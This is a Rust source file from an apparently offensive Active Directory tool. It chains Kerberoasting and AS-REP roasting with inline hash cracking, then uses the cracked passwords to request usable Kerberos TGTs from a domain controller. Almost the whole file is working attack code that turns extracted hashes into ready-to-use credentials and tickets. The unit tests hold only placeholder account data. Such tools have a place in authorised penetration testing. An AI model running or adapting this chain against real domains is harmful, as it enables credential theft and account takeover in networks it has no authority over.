//! Integrated Roast → Crack → Replay Loop
//!
//! Automates the full attack chain:
//! 1. Kerberoast or AS-REP roast target accounts
//! 2. Automatically crack hashes with inline cracker
//! 3. Request usable TGTs with cracked passwords
//! 4. Return ready-to-use credentials and tickets
//!
//! This bridges the gap between hunter (finding hashes) and forge
//! (using credentials), eliminating manual intervention.

use crate::asreproast::{self, AsRepRoastConfig};
use crate::crack::{CrackedCredential, crack_asrep_hashes, crack_kerberoast_hashes};
use crate::kerberoast::{self, KerberoastConfig};
use crate::runner::HuntConfig;
use kerberos_asn1::Asn1Object;
use overthrone_core::crypto::CrackerConfig;
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ═══════════════════════════════════════════════════════════
// Auto-Crack Result
// ═══════════════════════════════════════════════════════════

/// Result of the integrated roast→crack→replay loop
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoCrackResult {
    /// Successfully cracked credentials with TGTs
    pub cracked_with_tickets: Vec<CrackedTicket>,
    /// Cracked passwords that failed TGT request
    pub cracked_failed_ticket: Vec<CrackedCredential>,
    /// Hashes that couldn't be cracked
    pub failed_crack: usize,
    /// Total hashes attempted
    pub total_hashes: usize,
    /// Total time taken (ms)
    pub total_time_ms: u64,
}

/// A cracked credential with an associated TGT
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrackedTicket {
    /// The cracked credential
    pub credential: CrackedCredential,
    /// TGT ticket bytes (kirbi format)
    pub ticket_data: Vec<u8>,
    /// TGT expiration timestamp
    pub ticket_expiry: String,
}

// ═══════════════════════════════════════════════════════════
// Integrated Loop
// ═══════════════════════════════════════════════════════════

/// Run the full roast→crack→replay loop for Kerberoast
///
/// This function:
/// 1. Performs kerberoasting to extract TGS hashes
/// 2. Automatically cracks them with the inline cracker
/// 3. For each cracked password, requests a usable TGT
/// 4. Returns the cracked credentials with their tickets
///
/// # Example
/// ```ignore
/// let config = HuntConfig::default();
/// let kconfig = KerberoastConfig::default();
/// let cracker_config = CrackerConfig::default();
/// let result = kerberoast_auto_crack(&config, &kconfig, &cracker_config).await?;
/// println!("Cracked {} credentials with tickets", result.cracked_with_tickets.len());
/// ```
pub async fn kerberoast_auto_crack(
    hunt_config: &HuntConfig,
    kerb_config: &KerberoastConfig,
    cracker_config: &CrackerConfig,
) -> Result<AutoCrackResult> {
    let start = std::time::Instant::now();

    info!("╔══════════════════════════════════════════════════════╗");
    info!("║  Kerberoast → Crack → TGT Replay Loop              ║");
    info!("╚══════════════════════════════════════════════════════╝");

    // Step 1: Kerberoast
    info!("Step 1/3: Performing kerberoast...");
    let roast_result = kerberoast::run(hunt_config, kerb_config).await?;
    info!(
        "  Extracted {} hashes from {} SPNs",
        roast_result.hashes.len(),
        roast_result.spns_checked
    );

    if roast_result.hashes.is_empty() {
        warn!("No hashes extracted — aborting crack loop");
        return Ok(AutoCrackResult {
            cracked_with_tickets: Vec::new(),
            cracked_failed_ticket: Vec::new(),
            failed_crack: 0,
            total_hashes: 0,
            total_time_ms: start.elapsed().as_millis() as u64,
        });
    }

    // Step 2: Crack hashes
    info!("Step 2/3: Cracking {} hashes...", roast_result.hashes.len());
    let crack_report = crack_kerberoast_hashes(&roast_result.hashes, cracker_config)?;
    info!(
        "  Cracked {}/{} hashes in {}ms",
        crack_report.cracked.len(),
        crack_report.total_hashes,
        crack_report.time_ms
    );

    if crack_report.cracked.is_empty() {
        warn!("No hashes cracked — aborting TGT requests");
        return Ok(AutoCrackResult {
            cracked_with_tickets: Vec::new(),
            cracked_failed_ticket: Vec::new(),
            failed_crack: crack_report.failed.len(),
            total_hashes: roast_result.hashes.len(),
            total_time_ms: start.elapsed().as_millis() as u64,
        });
    }

    // Step 3: Request TGTs for cracked credentials
    info!("Step 3/3: Requesting TGTs for {} cracked credentials...", crack_report.cracked.len());
    let mut cracked_with_tickets = Vec::new();
    let mut cracked_failed_ticket = Vec::new();

    for credential in &crack_report.cracked {
        info!(
            "  Requesting TGT for {}\\{} with cracked password...",
            credential.domain, credential.username
        );

        match kerberos::request_tgt(
            &hunt_config.dc_ip,
            &credential.domain,
            &credential.username,
            &credential.password,
            false, // use password, not hash
        )
        .await
        {
            Ok(tgt_response) => {
                let ticket_bytes = tgt_response.ticket.build();
                let expiry = format_ticket_expiry(&tgt_response);

                info!(
                    "  ✓ TGT obtained for {}\\{} (expires: {})",
                    credential.domain, credential.username, expiry
                );

                cracked_with_tickets.push(CrackedTicket {
                    credential: credential.clone(),
                    ticket_data: ticket_bytes,
                    ticket_expiry: expiry,
                });
            }
            Err(e) => {
                warn!(
                    "  ✗ Failed to request TGT for {}\\{}: {}",
                    credential.domain, credential.username, e
                );
                cracked_failed_ticket.push(credential.clone());
            }
        }
    }

    let total_time = start.elapsed().as_millis() as u64;

    info!("╔══════════════════════════════════════════════════════╗");
    info!("║  Auto-Crack Loop Complete                           ║");
    info!("║  Total hashes: {}                              ║", roast_result.hashes.len());
    info!("║  Cracked with TGTs: {}                          ║", cracked_with_tickets.len());
    info!("║  Cracked (no TGT): {}                           ║", cracked_failed_ticket.len());
    info!("║  Failed to crack: {}                              ║", crack_report.failed.len());
    info!("║  Total time: {}ms                          ║", total_time);
    info!("╚══════════════════════════════════════════════════════╝");

    Ok(AutoCrackResult {
        cracked_with_tickets,
        cracked_failed_ticket,
        failed_crack: crack_report.failed.len(),
        total_hashes: roast_result.hashes.len(),
        total_time_ms: total_time,
    })
}

/// Run the full roast→crack→replay loop for AS-REP
///
/// This function:
/// 1. Performs AS-REP roasting to extract AS-REP hashes
/// 2. Automatically cracks them with the inline cracker
/// 3. For each cracked password, requests a usable TGT
/// 4. Returns the cracked credentials with their tickets
pub async fn asrep_auto_crack(
    hunt_config: &HuntConfig,
    asrep_config: &AsRepRoastConfig,
    cracker_config: &CrackerConfig,
) -> Result<AutoCrackResult> {
    let start = std::time::Instant::now();

    info!("╔══════════════════════════════════════════════════════╗");
    info!("║  AS-REP Roast → Crack → TGT Replay Loop            ║");
    info!("╚══════════════════════════════════════════════════════╝");

    // Step 1: AS-REP Roast
    info!("Step 1/3: Performing AS-REP roast...");
    let roast_result = asreproast::run(hunt_config, asrep_config).await?;
    info!("  Extracted {} hashes", roast_result.hashes.len());

    if roast_result.hashes.is_empty() {
        warn!("No hashes extracted — aborting crack loop");
        return Ok(AutoCrackResult {
            cracked_with_tickets: Vec::new(),
            cracked_failed_ticket: Vec::new(),
            failed_crack: 0,
            total_hashes: 0,
            total_time_ms: start.elapsed().as_millis() as u64,
        });
    }

    // Step 2: Crack hashes
    info!("Step 2/3: Cracking {} hashes...", roast_result.hashes.len());
    let crack_report = crack_asrep_hashes(&roast_result.hashes, cracker_config)?;
    info!(
        "  Cracked {}/{} hashes in {}ms",
        crack_report.cracked.len(),
        crack_report.total_hashes,
        crack_report.time_ms
    );

    if crack_report.cracked.is_empty() {
        warn!("No hashes cracked — aborting TGT requests");
        return Ok(AutoCrackResult {
            cracked_with_tickets: Vec::new(),
            cracked_failed_ticket: Vec::new(),
            failed_crack: crack_report.failed.len(),
            total_hashes: roast_result.hashes.len(),
            total_time_ms: start.elapsed().as_millis() as u64,
        });
    }

    // Step 3: Request TGTs for cracked credentials
    info!("Step 3/3: Requesting TGTs for {} cracked credentials...", crack_report.cracked.len());
    let mut cracked_with_tickets = Vec::new();
    let mut cracked_failed_ticket = Vec::new();

    for credential in &crack_report.cracked {
        info!(
            "  Requesting TGT for {}\\{} with cracked password...",
            credential.domain, credential.username
        );

        match kerberos::request_tgt(
            &hunt_config.dc_ip,
            &credential.domain,
            &credential.username,
            &credential.password,
            false, // use password, not hash
        )
        .await
        {
            Ok(tgt_response) => {
                let ticket_bytes = tgt_response.ticket.build();
                let expiry = format_ticket_expiry(&tgt_response);

                info!(
                    "  ✓ TGT obtained for {}\\{} (expires: {})",
                    credential.domain, credential.username, expiry
                );

                cracked_with_tickets.push(CrackedTicket {
                    credential: credential.clone(),
                    ticket_data: ticket_bytes,
                    ticket_expiry: expiry,
                });
            }
            Err(e) => {
                warn!(
                    "  ✗ Failed to request TGT for {}\\{}: {}",
                    credential.domain, credential.username, e
                );
                cracked_failed_ticket.push(credential.clone());
            }
        }
    }

    let total_time = start.elapsed().as_millis() as u64;

    info!("╔══════════════════════════════════════════════════════╗");
    info!("║  Auto-Crack Loop Complete                           ║");
    info!("║  Total hashes: {}                              ║", roast_result.hashes.len());
    info!("║  Cracked with TGTs: {}                          ║", cracked_with_tickets.len());
    info!("║  Cracked (no TGT): {}                           ║", cracked_failed_ticket.len());
    info!("║  Failed to crack: {}                              ║", crack_report.failed.len());
    info!("║  Total time: {}ms                          ║", total_time);
    info!("╚══════════════════════════════════════════════════════╝");

    Ok(AutoCrackResult {
        cracked_with_tickets,
        cracked_failed_ticket,
        failed_crack: crack_report.failed.len(),
        total_hashes: roast_result.hashes.len(),
        total_time_ms: total_time,
    })
}

// ═══════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════

/// Format TGT expiry time for display
fn format_ticket_expiry(tgt: &kerberos::TicketGrantingData) -> String {
    if let Some(end_time) = &tgt.end_time {
        end_time.to_string()
    } else {
        "unknown".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auto_crack_result_serializes() {
        let result = AutoCrackResult {
            cracked_with_tickets: Vec::new(),
            cracked_failed_ticket: Vec::new(),
            failed_crack: 5,
            total_hashes: 10,
            total_time_ms: 1234,
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("failed_crack"));
        assert!(json.contains("total_hashes"));
    }

    #[test]
    fn cracked_ticket_serializes() {
        use crate::crack::{CrackedCredential, CrackSource};

        let ticket = CrackedTicket {
            credential: CrackedCredential {
                username: "admin".to_string(),
                domain: "corp.local".to_string(),
                password: "P@ssw0rd".to_string(),
                hash_type: "Kerberoast".to_string(),
                source: CrackSource::Kerberoast,
            },
            ticket_data: vec![0x01, 0x02, 0x03],
            ticket_expiry: "2026-06-08T12:00:00Z".to_string(),
        };

        let json = serde_json::to_string(&ticket).unwrap();
        assert!(json.contains("admin"));
        assert!(json.contains("corp.local"));
        assert!(json.contains("ticket_expiry"));
    }
}
